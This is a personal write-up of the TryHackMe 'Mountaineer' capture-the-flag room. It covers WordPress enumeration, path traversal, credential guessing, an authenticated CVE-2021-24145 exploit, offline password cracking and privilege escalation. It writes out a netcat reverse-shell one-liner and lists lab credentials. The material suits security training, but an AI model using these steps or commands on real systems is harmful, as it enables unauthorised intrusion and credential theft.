---
title: Mountaineer
date: 2024-10-22
tags: [tryhackme, ctf]
author: nandakishor
---

# Mountaineer tryhackme
MOUNTAINEER
![alt text](<../assets/images/mountaineer/Screenshot 2024-10-22 141106.png>)

For initial recon i used rustscan with -sCV flag
![alt text](<../assets/images/mountaineer/Screenshot 2024-10-22 145602.png>)
![alt text](<../assets/images/mountaineer/Screenshot 2024-10-22 145707.png>)

Port 22 (SSH): Running OpenSSH 8.9p1 on Ubuntu
Port 80 (HTTP): Running nginx 1.18.0 on Ubuntu
To gather more detailed information, I followed up with a Nmap scan on the detected ports, which provided additional details:

The SSH server uses ECDSA and ED25519 host keys.
The HTTP service is running nginx, supporting basic methods like GET and HEAD. The default nginx welcome page was displayed, suggesting no specific web application was immediately accessible.


![alt text](../assets/images/mountaineer/image.png)
I run a ffuf scan and i found wordpress directory


![alt text](<../assets/images/mountaineer/Screenshot 2024-10-22 145844.png>)
This is the wordpress website, in the mean time i used ffuf to enumerate for more directories

![alt text](<../assets/images/mountaineer/Screenshot 2024-10-22 150118.png>)
we can see a domain name here so add it to /etc/hosts

![alt text](<../assets/images/mountaineer/Screenshot 2024-10-22 150253.png>)


![alt text](<../assets/images/mountaineer/Screenshot 2024-10-22 150549.png>)
This is the website

![alt text](<../assets/images/mountaineer/Screenshot 2024-10-22 151717.png>)
Use wpscan for more info, and

![alt text](<../assets/images/mountaineer/Screenshot 2024-10-22 151832.png>)
we can see a theme is installed init
I used to exploit it but it didnt worked

![alt text](<../assets/images/mountaineer/Screenshot 2024-10-22 152126.png>)
Also we got some usernames:

ChoOyu
Everest
MontBlanc
admin
everest
montblanc
chooyu
k2

save into a text file.

![alt text](<../assets/images/mountaineer/Screenshot 2024-10-22 152314.png>)
we can see a image directory , capture the request

![alt text](<../assets/images/mountaineer/Screenshot 2024-10-22 152704.png>)
We can see a potential path traversal here


![alt text](<../assets/images/mountaineer/Screenshot 2024-10-22 152831.png>)
I used chat gpt to find the location of ngix that we can get some info

![alt text](<../assets/images/mountaineer/Screenshot 2024-10-22 152916.png>)
this is the intersting location that i found


![alt text](<../assets/images/mountaineer/Screenshot 2024-10-22 153018.png>)
we can see a vhost name there, add it to /etc/host file

![alt text](<../assets/images/mountaineer/Screenshot 2024-10-22 153105.png>)

![alt text](<../assets/images/mountaineer/Screenshot 2024-10-22 153156.png>)
Its a login page, it requires creds, so i tries SQL injection and other login bypass methos, nothing worked so i used the username that we got from WP scan to bypass it

`k2:k2`

is the usename and password

![alt text](<../assets/images/mountaineer/Screenshot 2024-10-22 153904.png>)

![alt text](<../assets/images/mountaineer/Screenshot 2024-10-22 154017.png>)

i got a password

th3_tall3st_password_in_th3_world

And another intersting mail
![alt text](<../assets/images/mountaineer/Screenshot 2024-10-22 154109.png>)



We already have a password and username , so i used it against wp-admin

`k2:th3_tall3st_password_in_th3_world`
it worked
![alt text](<../assets/images/mountaineer/Screenshot 2024-10-22 154338.png>)


If we have the authentication we can use the exploit CVE-2021-24145

https://github.com/Hacker5preme/Exploits/tree/main/Wordpress/CVE-2021-24145

we can download it from here

And exploit it 
![alt text](<../assets/images/mountaineer/Screenshot 2024-10-22 154945.png>)

we got a shell

![alt text](<../assets/images/mountaineer/Screenshot 2024-10-22 155014.png>)

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ip port >/tmp/f

I used this to get the reverse shell
![alt text](<../assets/images/mountaineer/Screenshot 2024-10-22 155208.png>)

![alt text](<../assets/images/mountaineer/Screenshot 2024-10-22 155239.png>)

![alt text](<../assets/images/mountaineer/Screenshot 2024-10-22 155405.png>)
we can see a backup file here , get into my system and analyse it

http.server method doesnt worked so i used nc method to transfer file

![alt text](<../assets/images/mountaineer/Screenshot 2024-10-22 160201.png>)
![alt text](<../assets/images/mountaineer/Screenshot 2024-10-22 160311.png>)

I used john to crack the password

![alt text](<../assets/images/mountaineer/Screenshot 2024-10-22 160335.png>)

But the rockyou is't working for me , and its taking too much time,
so i created a custom wordlist to crack it

We can use tools like Crunch,cewl, cupp to do this,

i used cupp , Because 
![alt text](<../assets/images/mountaineer/Screenshot 2024-10-22 160856.png>)

this format looks similar to the cupp

![alt text](<../assets/images/mountaineer/Screenshot 2024-10-22 161146.png>)
we got out custom wordlist

![alt text](<../assets/images/mountaineer/Screenshot 2024-10-22 161249.png>)

The password is cracked

![alt text](<../assets/images/mountaineer/Screenshot 2024-10-22 161506.png>)

Basic Commands

![alt text](<../assets/images/mountaineer/Screenshot 2024-10-22 161643.png>)


![alt text](<../assets/images/mountaineer/Screenshot 2024-10-22 161731.png>)

We got a username and password , its probaly for ssh
![alt text](<../assets/images/mountaineer/Screenshot 2024-10-22 161827.png>)


![alt text](<../assets/images/mountaineer/Screenshot 2024-10-22 175735.png>)

Login using ssh
![alt text](<../assets/images/mountaineer/Screenshot 2024-10-22 175827.png>)


![alt text](<../assets/images/mountaineer/Screenshot 2024-10-22 180217.png>)
We can direcly get the root password brom the bash history

![alt text](<../assets/images/mountaineer/Screenshot 2024-10-22 180356.png>)
